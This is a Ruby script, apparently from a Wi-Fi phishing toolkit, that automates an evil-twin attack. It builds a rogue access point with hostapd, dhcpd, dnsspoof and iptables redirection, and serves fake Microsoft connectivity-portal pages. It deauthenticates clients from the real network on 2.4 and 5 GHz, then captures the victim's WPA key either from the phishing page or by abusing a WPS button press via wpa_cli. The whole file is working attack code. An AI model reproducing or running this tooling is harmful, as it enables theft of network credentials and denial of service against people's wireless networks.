#!/usr/bin/env ruby


require 'open3'
require 'highline/import'
require 'shellwords'
require 'colorize'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit... limpieza de ficheros...\e[0m"
  Dir.chdir '/tmp/hostbase-1.6ES'
sleep 1
system("ruby exit.rb")
  exit 130
end




class Berate
def self.berateNormal
File.open("carte.txt").readlines.each do |carte|
   puts carte
$carte = carte.chomp
end

File.open("canal.txt").readlines.each do |canal|
   puts canal
$canal = canal.chomp
end

File.open("ssid.txt").readlines.each do |ssid|
   puts ssid
$ssid = ssid.chomp
end

File.open("page.txt").readlines.each do |page|
   puts page
$page = page.chomp
end


puts"#{$carte}"
puts"#{$canal}"
puts"#{$ssid}"
puts"#{$page}"


puts "Preparando los ficheros de configuracion..."
`touch /tmp/hostbase-1.6ES/dhcpd.conf`
`touch /tmp/hostapd.conf`
sleep 1 # country_code a voir
`cat <<-EOF > /tmp/hostapd.conf
interface=#{$carte}
driver=nl80211
ssid=#{$ssid} 
hw_mode=g
ieee80211n=1
channel=3
EOF`
sleep 2
`cat <<-EOF > /tmp/hostbase-1.6ES/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 178.0.0.0 netmask 255.255.255.0 {
interface #{$carte};
range 178.0.0.2 178.0.0.10;
option routers 178.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 178.0.0.1;
allow unknown-clients;
}
EOF`
puts "Iniciando hostapd..."
system "hostapd /tmp/hostapd.conf >> /tmp/hostbase-1.6ES/hostapd.txt &> /dev/null &"
sleep 8
puts "\e[1;94m[*] Configuracion de iptables...\e[0m"
`ifconfig #{$carte} up`
`sysctl net.ipv4.ip_forward=1`
`ifconfig #{$carte} 178.0.0.1 netmask 255.255.255.0`
`ifconfig #{$carte} mtu 1400`
`iptables --flush`
`iptables --table nat --flush`
`iptables --delete-chain`
`iptables --table nat --delete-chain`
sleep 2;
`route add -net 178.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null`
`iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 178.0.0.1`
`iptables -P FORWARD ACCEPT`
`iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 178.0.0.1:80`
sleep 1
`echo > '/tmp/hostbase-1.6ES/dhcpd.leases'`
piddhcp = spawn('dhcpd -d -f -lf /tmp/hostbase-1.6ES/dhcpd.leases -cf /tmp/hostbase-1.6ES/dhcpd.conf')
sleep 2
system "dnsspoof -i #{$carte} &"
sleep 2
puts "\e[1;94m[*] Configuracion del sistema de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cp -R /etc/#{$page}/* /var/www/`
sleep 3
`mv #{$page}.php index.php`
`chown -R root:apache /var/www/*`
sleep 1
Dir.chdir '/var/www/shout'
sleep 1
`chown -R root:apache /var/www/shout/chat.txt`
`chmod 764 /var/www/shout/chat.txt`
`chmod  777 *`
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:apache /var/www/*`
sleep 1
Dir.chdir '/var/www/msftconnecttest/shout'
sleep 1
`chown -R root:apache /var/www/msftconnecttest/shout/chat.txt`
`chmod 764 /var/www/msftconnecttest/shout/chat.txt`
`chmod  777 *`
Dir.chdir '/var/www/msftconnecttest'
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:apache /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service start httpd`
sleep 4
Dir.chdir '/var/www'
sleep 1
`chmod 777 *`
`chown -R root:apache /var/www/cle.txt`
`chmod 764 /var/www/cle.txt`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Fake AP creado... préparacion de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.6ES'
sleep 1
Cle.cleWpa # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Fake AP creado... préparacion de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.6ES'
sleep 1
Wps.boutonWps # Lancement de la DoS ici et du code qui attend la victime
end
end
end

class Cle
def self.cleWpa
  puts"Fonction clé wifi"
  file = "cartef.txt"
  if File.exist?("cartef.txt")
    puts "Iniciando las interfaz en modo monitor..."
load 'accessdosbis.rb'
sleep 1
`rfkill unblock all`
`ip link set #{$cartef} down`
`iw dev #{$cartef} set type monitor`
sleep 2
`ip link set #{$cartef} up`
sleep 2
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type monitor`
sleep 2
`ip link set #{$cartedos} up`
sleep 3
puts "Iniciando la deauth en 2.4GHz y 5GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
dosbis = Thread.new { `bash rundos5ghz.sh` }
sleep 1
Attente.cleWifi
else
  load 'accessdos.rb'
puts "Iniciando la segunda tarjeta en modo monitor..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
sleep 3
puts "Iniciando la deauth en 2.4GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
Attente.cleWifi
end
end
end

class Wps
  def self.boutonWps
    puts"Fonction wps"
    file = "cartef.txt"
    if File.exist?("cartef.txt")
     puts "Iniciando las interfaz en modo monitor..."
  load 'accessdosbis.rb'
  `rfkill unblock all`
  sleep 1
  `ip link set #{$cartef} down`
  `iw dev #{$cartef} set type monitor`
  sleep 3
  `ip link set #{$cartef} up`
  sleep 4
  `ip link set #{$cartedos} down`
  `iw dev #{$cartedos} set type monitor`
  sleep 3
  `ip link set #{$cartedos} up`
  sleep 4
puts "Iniciando la deauth en 2.4GHz y 5GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
dosbis = Thread.new { `bash rundos5ghz.sh` }
sleep 1
Pbc.enAttenteduboutonwps
else
  load 'accessdos.rb'
puts "Iniciando la segunda tarjeta en modo monitor..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
sleep 3
puts "Iniciando la deauth en 2.4GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
Pbc.enAttenteduboutonwps
  end
 end
end

class Attente
  def self.cleWifi
    puts "Esperamos la victima... apoya ctrl+c para salir..."
loop do
sleep 1
if File.zero?("/var/www/msftconnecttest/cle.txt")
else
puts "\e[1;32m[*] La clé wifi WPA ha sido registrado en /var/www/msftconnecttest/cle.txt y /var/www/cle.txt \e[0m"
puts "\e[1;32m[*] Comando para recoger la clave wifi: cat /var/www/msftconnecttest/cle.txt y cat /var/www/cle.txt\e[0m"
puts "\e[1;32m[*] Clave wifi WPA-PSK:\e[0m"
Dir.chdir '/var/www/msftconnecttest'
sleep 2
File.open("cle.txt").readlines.each do |wpa|
   puts wpa.red
end
break
end
end
sleep 600
Dir.chdir '/tmp/hostbase-1.6ES'
  sleep 2
puts "\e[1;94m[*] Exit de hostbase... limpieza de ficheros... mira en /var/www/msftconnecttest/cle.txt o /var/www/cle.txt para recoger la clave wifi... \e[0m"
system("ruby exit.rb")
end
end

    class Pbc
      def self.enAttenteduboutonwps
        puts "Iniciando wash..."
  wash = Thread.new { `bash wash.sh` }
  sleep 3
  Dir.chdir '/tmp/hostbase-1.6ES'
  sleep 2
  puts "Esperamos la victima... ctrl+c para salir..."
  until File.read('wash.txt').include?('wps_selected_registrar')
  sleep 1
  end
  puts "\e[1;32m[*] Un usario se ha conectado y el boton WPS ha sido apoyado...\e[0m"
  puts "\e[1;32m[*] Paramos la DoS...\e[0m"
  Process.kill 15, File.read('/tmp/terminal.pid').to_i
  Process.kill 15, File.read('/tmp/hostbase-1.6ES/wash.pid').to_i
  `killall wash`
  if File.exist?("terminalfrequence.pid")
  sleep 1
  Process.kill 15, File.read('/tmp/hostbase-1.6ES/terminalfrequence.pid').to_i
  `killall wash`
  else
  nil
  end
  puts "Iniciando wpa_cli..."
  load 'historique.rb'
  `killall wash`
  `killall xterm`
  `killall sleep`
  `killall mdk3`
  `ip link set #{$cartedos} down`
  `iw dev #{$cartedos} set type managed`
  sleep 3
  `rfkill unblock all`
  `ip link set #{$cartedos} up`
  sleep 6
         puts "\e[1;32m[*] Esperamos la clave wifi...\e[0m"
  `killall wpa_supplicant`
  Dir.chdir '/etc'
  sleep 1
  `rm -rf wpa_supplicant.conf`
  `cp -R /tmp/hostbase-1.6ES/wpa_supplicant.conf /etc/`
  sleep 1;
  `sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
  sleep 2
  `killall wash`
  wpacli = Thread.new do
    while true
      system "xterm -e wpa_cli wps_pbc #{$bssid}" # A CHANGER PAR $BSSID  # On lance wpa_cli et wps_pbc en tant que thread
      sleep(20) # Temps avant la relance de la commande
    end
  end
  Selection.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
   sleep(5000000)
  end

class Selection
  def self.wpsGrab
  Dir.chdir '/etc'
  sleep 2
  until File.read('wpa_supplicant.conf').include?('WPA')
  sleep 1
  end
  puts "\e[1;32m[*] La clave wifi ha sido registrado en: /etc/wpa_supplicant.conf\e[0m"
  puts "\e[1;32m[*] Comando para recoger la clave wifi: cat /etc/wpa_supplicant.conf\e[0m"
  puts "\e[1;32m[*] Clave wifi WPA-PSK:\e[0m"
  File.open("wpa_supplicant.conf").readlines.each do |wpa|
     puts wpa
     `killall wpa_supplicant`
  end
  end
  end
end
